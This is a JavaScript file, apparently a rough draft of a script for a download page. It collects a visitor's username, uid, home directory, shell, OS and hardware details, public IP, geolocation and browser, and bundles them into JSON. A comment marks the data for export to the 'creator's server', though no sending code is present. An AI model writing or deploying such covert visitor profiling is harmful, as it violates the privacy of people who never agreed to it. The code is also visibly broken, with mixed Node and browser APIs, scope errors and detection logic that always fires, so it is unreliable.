/*
// grabbing file name for download page

function getInputFromTextBox() {
    var fileName = document.getElementById("userInput").value;
}

// replacing the file name in html page

const nameChange = document.querySelector('#downloadhere');

var iSrc = ()=> {
    nameChange = `Download ${fileName}`;
}
iSrc ();

*/

// Grabbing OS Info from Landed user


function osInfo(){

    const os = require('os');
    
    
    const username = os.userInfo().username;
    const uid = os.userInfo().uid;
    const homedir = os.userInfo().homedir;
    const shell = os.userInfo().shell;
    const osType = os.type();
    const osArch = os.arch();
    const osversion =os.version();
    const modelinfo = os.cpus()[1].model;
    const speedinfo = os.cpus()[1].speed;
    var freemem = (os.freemem() /1024/1024/1024).toFixed(2);
    var freeRam = (os.totalmem() /1024/1024/1024).toFixed(2);
    
    
    console.log(username);
    console.log(osType);
    console.log(osArch);
    console.log(uid);
    console.log(homedir);
    console.log(shell);
    console.log(osversion);
    console.log(modelinfo);
    console.log(speedinfo);
    console.log(`Free Space: ${freemem} GB`);
    console.log(`Free RAM: ${freeRam} GB`)
}
osInfo()   



// Getting IP Address of the Landed User

function getLocation(){

    fetch('https://api.ipify.org/?format=json')
    .then(results => results.json()).then(data => ipAdr= data.ip );
    
    fetch('https://geolocation-db.com/json/')
    .then(results => results.json()).then(data => console.log(`Latitude: ${data.latitude}, Longitude: ${data.longitude}`));
}
getLocation()

// Detecting the user's browser
function browserFind(){
var browser = '';

var isOpera = (window.opr && opr.addons) || window.opera || navigator.userAgent.indexOf(' OPR/') >= 0;{
    browser = 'Opera';}

var isFirefox = typeof InstallTrigger == 'undefined';{
    browser = 'Firefox';}

var isSafari = /constructor/i.test(window.HTMLElement) || (function (p) { return p.toString() === "[object SafariRemoteNotification]"; })(window['safari'] || (typeof safari == 'undefined' && safari.pushNotification));{
    browser = 'Chrome';}

var isIE = /*@cc_on@*/false || document.documentMode;{
    browser = 'Internet Explorer';}

var isEdge = isIE && window.StyleMedia;{
    browser = 'Microsoft Edge';}

var isChrome = window.chrome && (window.chrome.webstore || window.chrome.runtime);{
    browser = 'Chrome';}

var isBlink = (isChrome || isOpera) && window.CSS;{
    browser = 'Blink';}
}
browserFind()

// Creating a json file from the received data


var array = {};
var elements = []
array.elements = elements;

var singleElement = {
    "OS Name": osType,
    "Browser Name": browser,
    "IP Address": ipAdr

}
array.elements.push(singleElement);

console.log(array);



// Exporting data to creator's Server

module.exports